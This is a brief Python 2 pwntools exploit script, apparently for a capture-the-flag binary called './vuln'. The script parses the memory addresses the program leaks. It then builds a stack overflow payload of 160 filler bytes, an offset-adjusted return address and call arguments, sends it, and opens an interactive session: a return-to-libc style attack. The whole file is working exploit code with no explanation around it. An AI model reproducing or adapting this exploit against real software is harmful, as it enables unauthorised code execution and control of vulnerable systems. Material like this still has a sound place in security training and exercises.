#!/usr/bin/env python2

from pwn import *
import re
import sys
import os

# print()

def create_exploit_string(return_address, *parms):
    base = 'a'*160+p32(int(return_address,16) -149504)+'a'*4
    for parm in parms:
        base += p32(int(parm,16))
    return base

def exploit(socket):
    prompt = socket.recv();
    print(prompt)
    locations = re.findall(r"(\w{2,})[:]? 0x([0-9a-f]{8})", prompt)
    print(locations)

    # puts(useful_string) r.send(create_exploit_string(locations[0][1], locations[4][1]))
    r.send(create_exploit_string(locations[1][1] , locations[4][1]))
    r.interactive()

if __name__ == '__main__':
    name = "./vuln"
    binary = ELF(name)

    context.terminal=["tmux", "sp", "-h"]
    # context.log_level = 'DEBUG'

    r = process('./vuln', env={})
    exploit(r)
